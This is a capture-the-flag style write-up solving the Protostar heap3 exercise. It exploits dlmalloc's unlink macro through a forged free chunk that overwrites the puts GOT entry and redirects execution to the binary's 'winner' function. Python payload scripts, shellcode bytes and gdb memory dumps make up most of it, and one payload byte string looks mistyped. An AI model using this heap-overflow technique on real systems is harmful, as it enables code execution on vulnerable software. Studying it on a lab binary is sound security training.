### s0lv3d by H4yicl3


link https://exploit-exercises.com/protostar/heap3/


we can't compile it in true way!!
because the file need to compile in dlmalloc by  Doug Lea Malloc before fixed problem
so i try to download it in the vmware running protostar
with the following scp script
```
scp -p22 user@<address_of_protostar_vmware:/opt/protostar/bin/heap3 ./
```

try to read it before exploit the problem :http://phrack.org/issues/57/9.html#article


try to analysis it with gdb
```asm
pdis main
0x0804890a <+129>:   mov    eax,DWORD PTR [esp+0x1c]
b *main+129

```

that is the following code of this bug !!
```c
#define unlink(P, BK, FD)                                                \
{                                                                        \
  BK = P->bk;                                                            \
  FD = P->fd;                                                            \
  FD->bk = BK;                                                           \
  BK->fd = FD;                                                           \
}
```

the pseudo code c 
```
*(next->fd + 12) = next->bk
  *(next->bk + 8) = next->fd
```

it is double link list when free is called ! so we see the code we have 3 free 
so we need exploit here!

the first we need to change size of chunk greater than 80 byte !! because it has just happen when it wasn't fast bins(see more in the link i supply)

then we need create the fake of free chunk !!
so the alogrithm will be baited and heap meta data can be modified to change program execution

we choose argument 2 to overflow the chunk size of chunk3
```
gdb-peda$ x/60wx 0x0804c000 
0x804c000:      0x00000000      0x00000029      0x41414141      0x00000000
0x804c010:      0x00000000      0x00000000      0x00000000      0x00000000
0x804c020:      0x00000000      0x00000000      0x00000000      0x00000029
0x804c030:      0x42424242      0x00000000      0x00000000      0x00000000
0x804c040:      0x00000000      0x00000000      0x00000000      0x00000000
0x804c050:      0x00000000      0x00000029      0x43434343      0x00000000

```
the start of argument is 0x42424242 (address =0x804c030)
end is before 0x000000029 =0x804c054
offset =0x54-0x30 = 0x24 = 36 

so we need change it greater than 80 byte and the bit is used set
-> 0x51(bit 1 is make the alogrithm think the chunk is used)


ok !! the python of argument2 look like
```
padding ="A"*0x24
size ="\x51"
print padding+size
```

compile it
```
hayicle@ubuntu:~/ctf/protostar/heap$ python argurment2_for_heap3.py >2
```

try to run it in gdb

```
gdb-peda# r A `cat 2` C
gdb-peda$ x/60wx 0x0804c000 
0x804c000:      0x00000000      0x00000029      0x00000041      0x00000000
0x804c010:      0x00000000      0x00000000      0x00000000      0x00000000
0x804c020:      0x00000000      0x00000000      0x00000000      0x00000029
0x804c030:      0x41414141      0x41414141      0x41414141      0x41414141
0x804c040:      0x41414141      0x41414141      0x41414141      0x41414141
0x804c050:      0x41414141      0x00000051      0x00000043      0x00000000
0x804c060:      0x00000000      0x00000000      0x00000000      0x00000000
0x804c070:      0x00000000      0x00000000      0x00000000      0x00000f89
```

now we get the chunk size is 0x51
so we need to create the fake chunk look like
```
prev_size = even number and hence PREV_INUSE bit is unset.
size = -4
fd = puts_address – 12
bk = shellcode address
```
the puts_got function address
```
hayicle@ubuntu:~/ctf/protostar/heap$ objdump -R heap3_protostar 

heap3_protostar:     file format elf32-i386

DYNAMIC RELOCATION RECORDS
OFFSET   TYPE              VALUE 
0804b128 R_386_JUMP_SLOT   puts
...
```

we create it in argument3 
```python
puts_address = 0x0804b128
shellcode_address = 0x804c014    #heap segment of argument 1 we try to read shell code in argument 1
padding ="A"*(0x50-8) #subtract the size and prev_size
prev_size = "\xfc\xff\xff\xff" #its end with 0xc =0x1100 so the PREV_INUSE bit is unset
size ="\xfc\xff\xff\xff" # size = -4
fd = "\x1c\xb1\x04\x080" # (puts_address - 12)
bk = "\x14\xc0\x04\x08"  #shellcode_address 
print padding + prev_size + size + fd + bk
```

try to run this in gdb
```
gdb-peda$ x/60wx 0x0804c000 
0x804c000:      0x00000000      0x00000029      0x00000041      0x00000000
0x804c010:      0x00000000      0x00000000      0x00000000      0x00000000
0x804c020:      0x00000000      0x00000000      0x00000000      0x00000029
0x804c030:      0x41414141      0x41414141      0x41414141      0x41414141
0x804c040:      0x41414141      0x41414141      0x41414141      0x41414141
0x804c050:      0x41414141      0x00000051      0x41414141      0x41414141
0x804c060:      0x41414141      0x41414141      0x41414141      0x41414141
0x804c070:      0x41414141      0x41414141      0x41414141      0x41414141
0x804c080:      0x41414141      0x41414141      0x41414141      0x41414141
0x804c090:      0x41414141      0x41414141      0x41414141      0x41414141
0x804c0a0:      0xfffffffc      0xfffffffc      0x0804b11c      0x0804c014
```

look good !!

address winner
```
gdb-peda$ p winner
$1 = {void (void)} 0x8048864 <winner>
```

so we need to create the shellcode when the puts return after use in argument1
```python
address_of_winner =0x8048864
# asm code
# push 0x8048864
# ret
# try the asm online to create shellcode :https://defuse.ca/online-x86-assembler.htm#disassembly

padding ="A"*12 #start at 0x804c008 but we return at 0x804c014 need subtract = 12
shellcode ="\x68\x64\x88\x04\x08\xC3"
print padding+shellcode
```

try to run this
```asm
gdb-peda$ x/60wx 0x0804c000 
0x804c000:      0x00000000      0x00000029      0x41414141      0x41414141
0x804c010:      0x41414141      0x04886468      0x0000c308      0x00000000
0x804c020:      0x00000000      0x00000000      0x00000000      0x00000029
0x804c030:      0x41414141      0x41414141      0x41414141      0x41414141
0x804c040:      0x41414141      0x41414141      0x41414141      0x41414141
0x804c050:      0x41414141      0x00000051      0x41414141      0x41414141
0x804c060:      0x41414141      0x41414141      0x41414141      0x41414141
0x804c070:      0x41414141      0x41414141      0x41414141      0x41414141
0x804c080:      0x41414141      0x41414141      0x41414141      0x41414141
0x804c090:      0x41414141      0x41414141      0x41414141      0x41414141
0x804c0a0:      0xfffffffc      0xfffffffc      0x0804b11c      0x0804c014
```

look good

```
gdb-peda$ c
Continuing.
that wasn't too bad now, was it? @ 1483333812
[Inferior 1 (process 3654) exited with code 056]
```

try to run it without gdb
```
hayicle@ubuntu:~/ctf/protostar/heap$ ./heap3_protostar `cat 1` `cat 2` `cat 3`
that wasn't too bad now, was it? @ 1483333862
```

g00d luck  ! best fun :))

the material can read to understand more:https://sploitfun.wordpress.com/2015/02/26/heap-overflow-using-unlink/

